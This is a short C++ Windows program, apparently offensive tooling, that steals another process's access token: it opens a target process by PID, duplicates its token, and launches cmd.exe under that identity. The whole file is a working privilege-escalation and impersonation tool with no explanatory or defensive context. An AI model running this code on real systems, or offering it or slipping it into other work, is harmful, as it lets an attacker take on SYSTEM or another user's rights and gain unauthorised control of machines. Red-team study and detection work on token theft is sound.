#include <windows.h>
#include <iostream>
 
int main(int argc, char* argv[]) {
	char a;
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	//DWORD PID_TO_IMPERSONATE = 7148;
	wchar_t cmdline[] = L"C:\\windows\\system32\\cmd.exe";
 
	if (argc < 2) exit(1);
 
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
 
 
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));
	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
 
	std::cin >> a;
	return 0;
}
